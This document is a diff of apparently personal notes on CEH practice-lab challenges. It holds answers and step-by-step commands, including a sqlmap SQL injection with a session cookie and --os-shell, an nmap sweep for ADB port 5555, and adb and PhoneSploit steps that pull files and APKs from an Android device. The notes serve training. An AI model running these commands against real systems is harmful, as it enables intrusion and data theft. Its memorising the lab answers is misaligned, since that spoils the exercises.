@@ -414,7 +414,7 @@ As a cybersecurity analyst, your task is to identify potential vulnerabilities o
 
 Answer: 3
 
-**Challenge** 14: (we are here)
+**Challenge** 14:
 Perform a SQL Injection attack on www.moviescope.com and find out the number of users available in the database. (Format: N)
 - Use credentials found in **Challenge** 2 to login.
 **-once logged in -> go to user profile page and take note of the url, copy it in texteditor pluma
@@ -428,6 +428,10 @@ Perform a SQL Injection attack on www.moviescope.com and find out the number of 
 Answer: 5
 ** from here if you need shell access same as above
 - sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
+
+you can then type things like:
+"hostname" , "TASKLIST" , "help" , 
+
 
 **Challenge** 15:
 Perform a SQL Injection vulnerability scan on the target website www.moviescope.com and determine the WASC ID for SQL Injection (Format: NN)
@@ -445,11 +449,11 @@ Answer: 19
 -----------------------------------ENGAGE pt4-------------------------------------------------
 -----------------------------------ENGAGE pt4-------------------------------------------------
 
-**Challenge** 1:
+**Challenge** 1:we are here
 An employee's mobile device within CEHORG has been compromised, leading to an encrypted message BCtetx.txt being placed on the Android operating system. The password needed to decrypt the file is saved on EH-workstation-1. As an ethical hacker, your task is to decrypt the file using the password and input the extracted information. (note: the password file pawned.txt is stored in documents folder). (Format: *aaaaAN*NaN )
-- scan for open port 5555 in nmap
+- scan for open port 5555 in nmap *** nmap -sS -T5 192.168.10.0/24 -p5555, look for 5555/tcp open freeciv
 - adb connect 192.168.10.121
-- adb pull /sdcard
+- adb pull /sdcard C:\Users\admin\Desktop\log.txt 
 - find .txt file and copy to windows
 - open with BCtext encoder and decrypt with given password
 
@@ -461,7 +465,7 @@ A compromised Android device is suspected of containing malicious applications. 
 - python phonesploit.py
 - type 1 and enter ip address (192.168.10.121)
 - type n 2 times and press 36, then press1 -> press 2(com.cxinventor.com) and give some path to save apk
-- now type crc32 path to apk 
+- ** in default terminal type "crc32 <path to apk>"
 
 Answer: 53ac614c
 
@@ -471,7 +475,7 @@ A ZIP archive encompassing redundant images of a physical signature has been com
 
 Answer: k4.png
 
-**Challenge** 4:
+**Challenge** 4: we are here
 As a cybersecurity analyst, you are investigating a potential phishing campaign targeting Ruby, an employee at a local tech company. You have access to Ruby’s call log from the past few days, stored on an Android device within the target subnet 192.168.10.0/24. Identify the call in the log that is most likely a phishing attempt and provide the suspected phone number. (Format: +N (NNN) NNN-NNNN )
 - Open call log file inside the sdcard/call we pulled in previous **Challenge**
 - see suspect log
